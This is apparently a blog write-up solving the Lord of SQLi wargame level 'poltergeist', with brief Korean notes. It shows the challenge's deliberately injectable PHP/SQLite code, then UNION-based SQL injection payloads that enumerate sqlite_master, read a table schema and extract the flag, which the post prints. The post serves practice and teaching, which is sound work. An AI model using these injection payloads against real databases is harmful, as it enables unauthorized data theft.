---
title : "LOS Lv.40 poltergeist"
categories : [Wargame, rubiya]
---

## poltergeist
```php
query : select id from member where id='admin' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/poltergeist.db");
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  if($poltergeistFlag === $_GET['pw']) solve("poltergeist");
  // Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
  highlight_file(__FILE__);
?>
```

## Solution
```sql
CREATE TABLE sqlite_master(
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);
```
```
table 정보는 name 또는 tbl_name에서 빼올 수 있음.

column 정보는 sql에서 빼올 수 있음.
```
```
일단 table 목록을 빼올꺼임.

?pw=' union select name from sqlite_master --%20
```
```
Hello flag_70c81d99
```
```
Flag가 flag_hash에 있다했으므로 flag_70c81d99에 있음.
이젠 flag_70c81d99에 있는 column들을 빼올꺼임.

?pw=' union select sql from sqlite_master where name='flag_70c81d99' --%20
```
```
Hello CREATE TABLE `flag_70c81d99` ( `flag_0876285c` TEXT )
```
```
따라서 flag_0876285c의 값을 확인하면 됨.

?pw=' union select flag_0876285c from flag_70c81d99 --%20
```
```
Hello FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
```